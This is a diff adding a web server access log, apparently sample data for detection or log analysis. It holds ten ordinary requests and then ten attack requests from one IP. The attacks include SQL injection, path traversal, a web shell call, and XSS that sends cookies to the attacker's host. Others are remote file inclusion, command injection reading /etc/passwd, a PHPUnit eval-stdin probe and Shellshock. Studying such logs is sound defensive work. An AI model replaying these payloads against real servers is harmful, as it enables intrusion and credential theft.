@@ -1,0 +1,20 @@
+Aug 13 12:17:01 srv03 nginx[2200]: 10.0.0.15 - - [13/Aug/2026:12:17:01 +0300] "GET /index.html HTTP/1.1" 200 1024
+Aug 13 12:17:02 srv03 nginx[2200]: 10.0.0.15 - - [13/Aug/2026:12:17:02 +0300] "GET /static/css/style.css HTTP/1.1" 200 4520
+Aug 13 12:17:03 srv03 nginx[2200]: 10.0.0.20 - - [13/Aug/2026:12:17:03 +0300] "POST /api/v1/login HTTP/1.1" 200 320
+Aug 13 12:17:04 srv03 apache2[4100]: 10.0.0.25 - - [13/Aug/2026:12:17:04 +0300] "GET /products?cat=electronics HTTP/1.1" 200 8900
+Aug 13 12:17:05 srv03 apache2[4100]: 10.0.0.25 - - [13/Aug/2026:12:17:05 +0300] "GET /assets/js/app.js HTTP/1.1" 304 0
+Aug 13 12:17:06 srv03 nginx[2200]: 10.0.0.30 - - [13/Aug/2026:12:17:06 +0300] "GET /favicon.ico HTTP/1.1" 200 1400
+Aug 13 12:17:07 srv03 nginx[2200]: 10.0.0.30 - - [13/Aug/2026:12:17:07 +0300] "GET /about-us HTTP/1.1" 200 3100
+Aug 13 12:17:08 srv03 apache2[4100]: 10.0.0.35 - - [13/Aug/2026:12:17:08 +0300] "POST /contact/submit HTTP/1.1" 200 512
+Aug 13 12:17:09 srv03 nginx[2200]: 10.0.0.40 - - [13/Aug/2026:12:17:09 +0300] "GET /dashboard/overview HTTP/1.1" 200 12800
+Aug 13 12:17:10 srv03 apache2[4100]: 10.0.0.45 - - [13/Aug/2026:12:17:10 +0300] "GET /images/banner.jpg HTTP/1.1" 200 64500
+Aug 13 12:17:11 srv03 nginx[2200]: 194.26.29.112 - - [13/Aug/2026:12:17:11 +0300] "GET /page.php?id=1'%20UNION%20SELECT%20null,table_name%20FROM%20information_schema.tables--%20 HTTP/1.1" 200 1500
+Aug 13 12:17:12 srv03 apache2[4100]: 194.26.29.112 - - [13/Aug/2026:12:17:12 +0300] "GET /../../../../etc/passwd HTTP/1.1" 403 280
+Aug 13 12:17:13 srv03 nginx[2200]: 194.26.29.112 - - [13/Aug/2026:12:17:13 +0300] "POST /uploads/shell.php?cmd=id HTTP/1.1" 200 120
+Aug 13 12:17:14 srv03 apache2[4100]: 194.26.29.112 - - [13/Aug/2026:12:17:14 +0300] "GET /search.php?q=document.location='http://194.26.29.112/c='*document.cookie HTTP/1.1" 200 450
+Aug 13 12:17:15 srv03 nginx[2200]: 194.26.29.112 - - [13/Aug/2026:12:17:15 +0300] "GET /view.php?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 2400
+Aug 13 12:17:16 srv03 apache2[4100]: 194.26.29.112 - - [13/Aug/2026:12:17:16 +0300] "POST /api/xml HTTP/1.1" 200 310 "]>"
+Aug 13 12:17:17 srv03 nginx[2200]: 194.26.29.112 - - [13/Aug/2026:12:17:17 +0300] "GET /ping.php?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1" 200 1800
+Aug 13 12:17:18 srv03 apache2[4100]: 194.26.29.112 - - [13/Aug/2026:12:17:18 +0300] "PUT /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 50 ""
+Aug 13 12:17:19 srv03 nginx[2200]: 194.26.29.112 - - [13/Aug/2026:12:17:19 +0300] "GET /index.php?page=https://194.26.29.112/malicious.txt HTTP/1.1" 200 950
+Aug 13 12:17:20 srv03 apache2[4100]: 194.26.29.112 - - [13/Aug/2026:12:17:20 +0300] "POST /cgi-bin/test-cgi HTTP/1.1" 500 0 "User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'"
